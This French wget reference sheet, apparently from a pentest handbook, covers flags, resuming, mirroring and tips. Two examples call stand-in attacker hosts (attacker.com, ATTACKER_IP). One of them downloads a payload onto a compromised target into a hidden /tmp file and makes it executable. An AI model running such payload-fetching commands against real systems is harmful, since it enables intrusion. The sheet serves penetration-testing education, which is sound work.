# 🛠️ wget — Téléchargement Non Interactif

## 1. Description rapide

**wget** est un utilitaire de téléchargement non interactif supportant HTTP, HTTPS et FTP. Contrairement à `curl`, il est orienté **téléchargement de fichiers** et gère nativement la reprise, le téléchargement récursif et le mirroring de sites. Utile en pentest pour récupérer des outils sur une cible ou exfiltrer des fichiers.

---

## 2. Syntaxe de base

```bash
wget [options] URL [URL...]
```

Sans option, `wget` télécharge le fichier de l'URL dans le répertoire courant avec son nom d'origine.

---

## 3. Options et fanions principaux

| Flag | Rôle |
| --- | --- |
| `-O FILE` | Sauvegarde sous un nom de fichier spécifié |
| `-q` | Mode silencieux (pas de sortie sauf erreurs) |
| `-c` | Reprend un téléchargement interrompu |
| `-b` | Téléchargement en arrière-plan (background) |
| `-P DIR` | Sauvegarde dans un répertoire spécifique |
| `--mirror` | Miroir récursif (équivalent à `-r -N -l inf --no-remove-listing`) |
| `-r` | Téléchargement récursif |
| `-l N` | Profondeur de récursion maximale |
| `-A EXT` | Télécharge uniquement les fichiers avec l'extension spécifiée |
| `--no-check-certificate` | Ignore les erreurs de certificat SSL |
| `--user-agent="UA"` | Spécifie un User-Agent personnalisé |
| `--header="H: V"` | Ajoute un en-tête HTTP |
| `--post-data="DATA"` | Envoie une requête POST |
| `-nH` | Ne crée pas de répertoire avec le nom de l'hôte |
| `--cut-dirs=N` | Coupe N niveaux de répertoires dans la structure locale |

---

## 4. Exemples pratiques

```bash
# Téléchargement simple en renommant le fichier localement
wget -O /tmp/linpeas.sh https://attacker.com/linpeas.sh
```

```bash
# Téléchargement silencieux en arrière-plan (log dans wget-log)
wget -q -b https://example.com/largefiles.tar.gz
```

```bash
# Reprendre un téléchargement interrompu
wget -c https://example.com/bigfile.iso
```

```bash
# Miroir complet d'un site web (structure locale préservée)
wget --mirror --convert-links --adjust-extension -P /srv/mirror/ https://example.com
```

```bash
# Téléchargement récursif uniquement des PDFs d'un répertoire
wget -r -l2 -A pdf https://example.com/docs/
```

```bash
# Récupérer un fichier depuis un serveur HTTP de l'attaquant sur une cible compromise
wget -q http://ATTACKER_IP:8080/payload.sh -O /tmp/.payload.sh && chmod +x /tmp/.payload.sh
```

---

## 5. Astuces & Pièges à éviter

!!! tip "wget vs curl : lequel choisir ?"
    **wget** est préférable pour les téléchargements de fichiers simples, la reprise (`-c`) et le mirroring. **curl** est préférable pour manipuler des headers, interagir avec des APIs REST et router via Burp. Sur une cible compromise, vérifier lequel est disponible : `which wget curl`.

!!! tip "Téléchargement en arrière-plan avec suivi"
    `wget -b URL` lance en background et écrit dans `wget-log`. Suivre avec `tail -f wget-log` pour monitorer la progression.

!!! warning "--mirror peut générer une quantité de données importante"
    `--mirror` sans limites de profondeur peut télécharger l'intégralité d'un site (potentiellement des Go). Ajouter `-l N` (profondeur) et `--quota=SIZE` (limite de taille) pour maîtriser le volume téléchargé.

!!! warning "--no-check-certificate = vulnérable au MitM"
    Comme `curl -k`, ignorer les certificats TLS expose le téléchargement à une interception. En contexte pentest d'une cible, c'est acceptable. En automatisation de production, toujours valider les certificats.
